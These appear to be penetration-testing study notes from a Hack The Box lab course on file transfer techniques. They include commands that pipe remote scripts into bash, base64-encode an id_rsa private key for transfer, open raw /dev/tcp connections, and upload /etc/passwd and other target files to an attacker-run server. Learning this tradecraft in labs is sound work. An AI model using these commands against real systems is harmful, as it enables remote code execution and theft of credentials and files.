# Download Operations

## Base64 Encoding / Decoding

Check file MD5 hash and encode the contents using base64:
```shell-session
[/htb]$ md5sum <file name>

[/htb]$ cat id_rsa |base64 -w 0;echo
```

Decode the base64 string from the target machine and check that the MD5 hash matches:
```shell-session
[/htb]$ echo -n '<base64 string>' | base64 -d > <file name>

[/htb]$ md5sum <file name>
```

## Web Downloads with Wget and cURL

Download a file using Wget:
```shell-session
[/htb]$ wget <URL> -O <path to download>
```

Download a file using cURL:
```shell-session
[/htb]$ curl -o <path to download> <url>
```

## Fileless Attacks Using Linux

Load script into the memory:
```shell-session
[/htb]$ curl <Script URL> | bash // Method 1

[/htb]$ wget -qO- <Python script URL> | python3 // Method 2, Only for Python scripts
```

## Download with Bash (/dev/tcp)

Connect to the target web server:
```shell-session
[/htb]$ exec 3<>/dev/tcp/<ip address>/<port>
```

Make an HTTP GET request and print the response:
```shell-session
[/htb]$ echo -e "GET /<file name> HTTP/1.1\n\n">&3

[/htb]$ cat <&3
```

## SSH Downloads

Set-up and start the SSH server:
```shell-session
[/htb]$ sudo systemctl enable ssh

[/htb]$ sudo systemctl start ssh
```

Download files using SCP:
```shell-session
scp <username>@<ip address>:<file path> . 
```

You can create a temporary account to avoid using your primary credentials.

# Upload Operations

## Web Upload

Download and start uploadserver (extended module of HTTP.Server):
```shell-session
[/htb]$ sudo python3 -m pip install --user uploadserver // Download the upload server

[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' // Generate a self signed certificate

[/htb]$ mkdir <direcotry> && cd <directory> // Make a new directory for the server so you don't host the certificate

[/htb]$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem // Start the server
```

Upload multiple files from the target machine:
```shell-session
[/htb]$ curl -X POST https://<ip address>/upload -F 'files=@<file 1 path>' -F 'files=@<file 2 path>' --insecure // --insecure because the trusted self signed certificate
```

## Alternative Web File Transfer Method

Creating a web server with Python3:
```shell-session
[/htb]$ python3 -m http.server
```

Creating a web server with Python2.7:
```shell-session
[/htb]$ python2.7 -m SimpleHTTPServer
```

Creating a web server with PHP:
```shell-session
[/htb]$ php -S 0.0.0.0:8000
```

Creating a web server with Ruby:
```shell-session
[/htb]$ ruby -run -ehttpd . -p8000
```

Downloading a file from the created server:
```shell-session
[/htb]$ wget <ip address>:8000/<file name>
```

Firewall might block the inbound traffic, we are not uploading the file to our machine with that method.

## SCP Upload

Can work when a company allows SSH outbound connections

Uploading a file using SCP:
```shell-session
[/htb]$ scp <file path> <username>@<ip address>:<target path>
```

# HTTP/S

## Nginx - Enabling PUT

Create a Directory to Handle Uploaded Files:
```shell-session
Wildland4958@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

Change the owner to www-data:
```shell-session
Wildland4958@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

Create Nginx configuration file by creating the file `/etc/nginx/sites-available/upload.conf` with the contents:
```shell-session
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

Symlink our Site to the sites-enabled Directory:
```shell-session
Wildland4958@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

Start Nginx:
```shell-session
Wildland4958@htb[/htb]$ sudo systemctl restart nginx.service
```

#### Verifying Errors

```shell-session
Wildland4958@htb[/htb]$ tail -2 `/var/log/nginx/error.log`

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
```

```shell-session
Wildland4958@htb[/htb]$ ss -lnpt | grep `80`

LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))
```

```shell-session
Wildland4958@htb[/htb]$ ps -ef | grep `2811`

user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
```

Remove NginxDefault Configuration:
```shell-session
Wildland4958@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
```

Uploading file using cURL:
```shell-session
Wildland4958@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```